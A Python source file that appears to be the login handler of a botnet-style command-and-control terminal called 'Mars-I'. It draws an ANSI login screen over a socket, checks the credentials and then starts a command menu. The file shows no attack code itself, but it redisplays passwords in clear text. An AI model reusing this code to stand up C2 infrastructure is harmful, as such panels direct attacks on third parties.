from files.networking.sender import send
import socket
from files.admin.controller import login as hander
from files.networking.commands import main_menu
import time
import threading
def ReadSocket(sock,length):
	data = ""
	while data == "":
		data += sock.recv(length).decode(errors='ignore').strip()
	return data
def login_calc(string): return len("                         ") - len(string) - 1
ansi_clear="[2J[1;1H"
def login_handler(): pass
def cnc_login(client:socket.socket, address):
    send(client, f'\33]0;Mars-I Terminal.  |  Authenticate To Continue.\a', False)
    while 1:
        send(client, ansi_clear, False)
        send(client, "[0m[7m                             Please Login To Continue                           [0m")
        send(client,"")
        send(client, "")
        send(client, "")
        send(client, "")
        send(client, "")
        send(client, "")
        send(client, "")
        send(client, f'                             Username:[107m                         [0m')
        send(client,"")
        send(client, "")
        send(client, f'                             Password:[107m                         [0m')
        send(client,f"[12B[7m                                Welcome To Mars-I                               [0m[15A[40D[107;30m",reset=False, escape=False)
        try:
            username = ReadSocket(client, 1024)
        except:
            client.close()
            print("shit - 1")
            break
        if not username:
            continue
        break
    send(client, "[11B[7m                                Welcome To Mars-I                               [0m[0m[0m")
    send(client, ansi_clear)
    # password login
    password = ''
    while 1:
        send(client, ansi_clear, False)
        send(client, "[2J[0m[7m                             Please Login To Continue                           [0m")
        send(client,"")
        send(client, "")
        send(client, "")
        send(client, "")
        send(client, "")
        send(client, "")
        send(client, "")
        send(client, f'                             Username:[107;30m {username}{" "*login_calc(username)}[0m')
        send(client,"")
        send(client, "")
        send(client, f'                             Password:[107;30m                         [0m')
        send(client,f"[12B[7m                                Welcome To Mars-I                               [0m[12A[40D[107;30m",reset=False, escape=False)
        while not password.strip():
            password = ReadSocket(client, 1024)
        break
    send(client, "[11B[107;92m                               Checking login details...                        [0m[0m[0m[0m")
    send(client, ansi_clear, False)
    send(client,"[?25l", False)
    send(client, "[0m[7m                             Please Login To Continue                           [0m")
    send(client,"")
    send(client, "")
    send(client, "")
    send(client, "")
    send(client, "")
    send(client, "")
    send(client, "")
    send(client, f'[0m                             Username:[107;30m {username}{" "*login_calc(username)}[0m')
    send(client,"")
    send(client, "")
    send(client, f'[0m                             Password:[107;30m {password}{" "*login_calc(password)}[0m')
    send(client,f"[0m[12B[102;30m                               Checking login details...                        [0m[12A[40D[107;30m",reset=False, escape=False)
    time.sleep(1)
    login = hander(username, password)
    if login == False:
        send(client, "[11B[107;91m                                    Login Failed!                               [0m[0m[0m")
        send(client, ansi_clear, False)
        send(client,"[?25l", False)
        send(client, "[0m[7m                             Please Login To Continue                           [0m")
        send(client,"")
        send(client, "")
        send(client, "")
        send(client, "")
        send(client, "")
        send(client, "")
        send(client, "")
        send(client, f'[0m                             Username:[107;30m {username}{" "*login_calc(username)}[0m')
        send(client,"")
        send(client, "")
        send(client, f'[0m                             Password:[107;30m {password}{" "*login_calc(password)}[0m')
        send(client,f"[0m[14B[101;30m                                    Login Failed!                               [0m[14A[40D[107;30m",reset=False, escape=False)
        time.sleep(1)
        client.close()
        return 0
    if login == "error":
        send(client, "[11B[7m                                    Login Error!                                [0m[0m[0m")
        send(client, ansi_clear)
        send(client, ansi_clear, False)
        send(client,"[?25l", False)
        send(client, "[0m[7m                             Please Login To Continue                           [0m")
        send(client,"")
        send(client, "")
        send(client, "")
        send(client, "")
        send(client, "")
        send(client, "")
        send(client, "")
        send(client, f'[0m                             Username:[107;30m {username}{" "*login_calc(username)}[0m')
        send(client,"")
        send(client, "")
        send(client, f'[0m                             Password:[107;30m {password}{" "*login_calc(password)}[0m')
        send(client,f"[0m[14B[101;30m                                     Login Error!                                [0m[14A[40D[107;30m",reset=False, escape=False)
        time.sleep(1)
        client.close()
        print("shit")
        return
    send(client, "[24A[H")
    for i in range(25):
        send(client, f"[{str(i)}A[0m")
    login = hander(username, password)
    if username in login[0]:
            threading.Thread(target=main_menu, args=[client, username, login[3], login[2], login[4], address[1],]).start() 
    else:
         return